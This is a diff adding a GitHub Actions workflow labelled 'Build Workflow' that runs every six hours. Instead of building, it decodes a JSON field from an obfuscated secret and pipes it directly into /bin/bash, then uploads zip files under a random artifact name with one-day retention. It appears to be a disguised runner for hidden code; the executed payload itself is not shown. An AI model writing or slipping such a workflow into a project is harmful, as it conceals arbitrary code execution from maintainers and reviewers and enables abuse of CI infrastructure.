@@ -1,0 +1,27 @@
+name: Build Workflow
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '16 1,7,13,19 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute
+        env:
+          tn968: ${{ secrets.tn968 }}
+        run: |
+          printf '%s' "$tn968" | jq -r .whj4765 | /bin/bash
+          printf '%s' "$dam72" | jq -r .os839 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: aJGBtM5E
+          path: "*.zip"
+          retention-days: 1
